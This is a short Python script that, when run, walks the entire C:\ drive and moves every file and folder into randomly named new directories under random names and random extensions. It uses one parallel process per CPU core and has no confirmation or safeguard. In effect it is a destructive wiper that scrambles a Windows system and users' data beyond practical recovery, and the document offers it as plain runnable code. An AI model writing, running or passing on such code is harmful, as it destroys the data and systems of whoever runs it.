import os
import random
import string
import shutil
import multiprocessing

def generate_random_name(length=8):
    # Generate a random name of the specified length
    name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
    return name

def generate_random_extension():
    # Generate a random extension of 3 characters
    extension = ''.join(random.choices(string.ascii_lowercase, k=3))
    return extension

def create_random_directory(root):
    # Create a random directory within the specified root
    random_name = generate_random_name()
    random_directory = os.path.join(root, random_name)
    os.makedirs(random_directory)
    return random_directory

def rename_and_move_files_and_folders(root):
    for root, dirs, files in os.walk(root):
        # Create a random destination directory
        destination_directory = create_random_directory(root)

        # Rename files in the current directory and move them to the random destination
        for file in files:
            old_file_path = os.path.join(root, file)
            random_name = generate_random_name()
            random_extension = ''.join(random.choices(string.ascii_lowercase, k=3))
            new_file_path = os.path.join(destination_directory, f'{random_name}.{random_extension}')

            try:
                shutil.move(old_file_path, new_file_path)
                print(f'Moved and renamed {old_file_path} to {new_file_path}')
            except Exception as e:
                print(f'Skipped {old_file_path} (error: {str(e)})')

        # Rename folders in the current directory and move them to the random destination
        for folder in dirs:
            old_folder_path = os.path.join(root, folder)
            random_name = generate_random_name()
            new_folder_path = os.path.join(destination_directory, random_name)

            try:
                shutil.move(old_folder_path, new_folder_path)
                print(f'Moved and renamed {old_folder_path} to {new_folder_path}')
            except Exception as e:
                print(f'Skipped {old_folder_path} (error: {str(e)})')

if __name__ == '__main__':
    # Number of parallel processes to use
    num_processes = multiprocessing.cpu_count()

    # Create a multiprocessing pool
    pool = multiprocessing.Pool(processes=num_processes)

    # Process the root directory in parallel (e.g., 'C:\\')
    pool.map(rename_and_move_files_and_folders, ['C:\\'] * num_processes)

    # Close the pool to release resources
    pool.close()
    pool.join()
